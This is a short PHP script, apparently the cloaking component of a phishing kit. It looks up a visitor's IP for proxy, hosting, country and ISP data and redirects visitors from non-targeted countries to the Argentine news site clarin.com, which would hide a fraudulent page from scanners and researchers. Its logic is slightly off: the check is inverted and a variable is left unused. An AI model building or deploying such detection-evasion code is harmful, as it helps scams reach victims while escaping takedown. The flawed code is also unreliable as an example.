<?php
include './config.php';
require_once 'cloack.php';

$ip = getIP();
$geolocation_data = geolocationIp($ip);
$proxy = $geolocation_data["proxy"];
$hosting = $geolocation_data["hosting"];
$country_code = $geolocation_data["countryCode"];
$isp = $geolocation_data["isp"];
$bye = false;
if ($comprobate_country == false) {
    if (!comprobateCountry($countries_allowed, $country_code)) {
        $bye = false;
        header('location: https://clarin.com/');
    }
}




?>